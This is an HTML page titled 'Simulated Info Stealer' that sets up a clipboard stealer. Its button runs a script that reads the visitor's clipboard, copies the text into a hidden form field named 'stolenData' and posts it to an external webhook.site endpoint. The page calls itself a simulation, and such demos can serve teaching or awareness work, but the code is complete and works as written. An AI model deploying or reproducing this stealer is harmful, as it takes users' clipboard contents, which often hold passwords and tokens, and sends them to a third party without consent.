<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Simulated Info Stealer ‚Äì Form POST</title>
  <style>
    body {
      background-color: #1a1a2e;
      color: #ffffff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    h1 {
      color: #FF4C4C;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      margin-top: 20px;
      background-color: #cc0000;
      border: none;
      border-radius: 8px;
      color: white;
      cursor: pointer;
      transition: 0.2s ease;
    }
    button:hover {
      background-color: #ff4c4c;
      color: #000;
    }
  </style>
</head>
<body>
  <h1>Simulated Info Stealer via Form POST</h1>
  <button onclick="stealClipboard()">üö® Steal Clipboard</button>

  <form id="stealerForm" method="POST" action="https://webhook.site/bccdd9d5-8014-4db8-a68f-853ec9753d9b" target="_blank">
    <input type="hidden" name="stolenData" id="stolenData" />
  </form>

  <script>
    async function stealClipboard() {
      try {
        const data = await navigator.clipboard.readText();
        document.getElementById("stolenData").value = data;
        document.getElementById("stealerForm").submit();
      } catch (err) {
        alert("‚ùå Failed to read clipboard: " + err);
      }
    }
  </script>
</body>
</html>
